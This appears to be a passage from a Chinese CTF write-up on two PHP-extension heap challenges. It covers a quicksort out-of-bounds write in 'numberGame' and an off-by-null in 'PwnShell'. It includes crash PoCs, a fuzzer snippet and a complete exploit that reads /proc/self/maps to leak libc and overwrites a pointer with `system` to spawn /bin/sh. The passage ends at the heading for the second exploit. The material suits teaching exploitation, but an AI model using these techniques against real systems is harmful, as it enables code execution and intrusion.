
## `_quicksort` 越界问题

跑起来验证一下也就是 `_quicksort` 排序的时候越界的问题，把 `size` 修改得任意大了，甚至 `name` 字段也被覆盖了：

```php
// Return code: -11
// Stderr:
<?php
add_chunk(14, [0x5ac569df, 0x6c313c17, 591877129, 0x1fe65652, -944419699, -841403074, 154814687, 0xe98c4764, -864569255, 0xb719576e, 0xa73bb273, 0xd8f3896e, -902885394, 0x30dfbfa0], "U");
edit_name(10, "C");
edit_name(11, "4");
edit_chunk(13, 5, -1358782844);
edit_chunk(2, 11, 704899367);
show_chunk(6);
show_chunk(0);
show_chunk(5);
add_chunk(3, [0xaad0a2ba, -1645749333, 0x6fcf2a, 0x588abdfe, 0xb6b4a49f, 1414422535, -120011198], "z");
```

这个时候可以手工删减 poc，以确定触发漏洞的输入：

```php
<?php
add_chunk(14, [0x5ac569df, 0x6c313c17, 591877129, 0x1fe65652, -944419699, -841403074, 154814687, 0xe98c4764, -864569255, 0xb719576e, 0xa73bb273, 0xd8f3896e, -902885394, 0x30dfbfa0], "U");
show_chunk(0);
```

这样就可以确定是排序导致的问题了，这个时候可以进一步针对这个数组序列构造 fuzz：

```python
def generate_number():
    """生成随机整数（十进制或十六进制）"""
    return hex(random.getrandbits(32))

def generate_string():
    """生成随机PHP字符串"""
    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_'
    return f'"{random.choices(chars, k=random.randint(5, 15))[0]}"'

def generate_php_code():
    """生成随机PHP测试用例"""
    code = ["<?php\n"]
    size = random.randint(1, 5)
    numbers = [generate_number() for _ in range(size)]  # 固定5个元素
    name = generate_string()
    code.append(f"add_chunk({size}, [{', '.join(numbers)}], {name});\n")
    code.append(f"show_chunk({0});\n")
```

这样跑起来就得到了很简单的 poc：

```php
// Return code: -11
// Stderr:
<?php
add_chunk(4, [0xcb949c35, 0x177c5522, 0xfec7b323, 0x726bb3bc], "i");
show_chunk(0);
```

会把 `size` 改大：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_PWJNV6EHB9KEYPS.png)

这样可以得到一个在 php 堆上的下溢任意地址写：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_9CE76S4WD78EXQU.png)

思路也比较简单，就是第一次利用越界写修改下一个 chunk 的 `name` 指针，再利用这个 `name` 指针实现任意地址写。这里给出直接打本地的脚本，远程同理：

```php
<?php

$game_base = 0;
$libc_base = 0;
$libc = "";
$mbase = "";

function u64($leak){
    $leak = strrev($leak);
    $leak = bin2hex($leak);
    $leak = hexdec($leak);
    return $leak;
}

function p64($addr){
    $addr = dechex($addr);
    $addr = hex2bin($addr);
    $addr = strrev($addr);
    $addr = str_pad($addr, 8, "\x00");
    return $addr;
}

function leakaddr($buffer){
    global $libc, $mbase;
    $p = '/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/';
    $p1 = '/([0-9a-f]+)\-[0-9a-f]+ .* \/home\/l1qu1d\/pwn\/chall\/php_pwn\/numberGame\/numberGame.so/';
    preg_match_all($p, $buffer, $libc);
    preg_match_all($p1, $buffer, $mbase);
    return "";
}

ob_start("leakaddr");
include("/proc/self/maps");
$buffer = ob_get_contents();
ob_end_flush();
leakaddr($buffer);
$libc_base = hexdec($libc[1][0]);
$game_base = hexdec($mbase[1][0]);
echo "Libc base => " . dechex($libc_base) . "\n";
echo "game base => " . dechex($libc_base) . "\n";

$offset = ($game_base + 0x4008) & 0xffffffff;
$system = $libc_base + 0x58750;
echo "offset => " . dechex($offset) . "\n";
echo "system => " . dechex($system) . "\n";

add_chunk(5, [0, 0, 0, 0x80000000, 0], "GeekCmore");
add_chunk(5, [0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef], "GeekCmore");
add_chunk(1, [0], "/bin/sh");
show_chunk(0);
edit_chunk(0, 18, $offset);

edit_name(1, substr(p64($system), 0, 6));
edit_name(2, "1")
?>
```

### 堆 off by null：PwnShell

题目还是一个典型的堆菜单，分析结构体有点抽象，感觉是为了埋洞之后方便利用搞的：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_2764TKEB42QQFQ5.png)

漏洞点是 `addHakcer` 的时候存在一个 off by null 的漏洞：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_CK8FEHVJBPJST7M.png)

按照如下布局：

```php
<?php
addHacker("aaaaaaaa", "bbbbbbb");
addHacker("cccccccc", "ddddddd");
removeHacker(1);
addHacker("gggggggg", "hhhhhhh");
removeHacker(0);
addHacker("eeeeeeee", "ffffffff");

displayHacker(0);
?>
```

即可覆盖 `chunkList[1].ptr->str1_ptr`：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_EWPF6AS9H9HHT4G.png)

结合 `editHacker` 的修改能力：

```php
<?php
addHacker("aaaaaaaa", "bbbbbbb");
addHacker("cccccccc", "ddddddd");
removeHacker(1);
addHacker("gggggggg", "hhhhhhh");
removeHacker(0);
addHacker("eeeeeeee", "ffffffff");

editHacker(1, "hacked!!");
displayHacker(0);
?>
```

能在堆上进行一定的篡改：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_S9V8J7ECT4H6VXF.png)

通过适当构造可以得到任意地址写：

![image](https://bbs.kanxue.com/upload/attach/202504/950404_F884MSR65R24B2M.png)

exp：
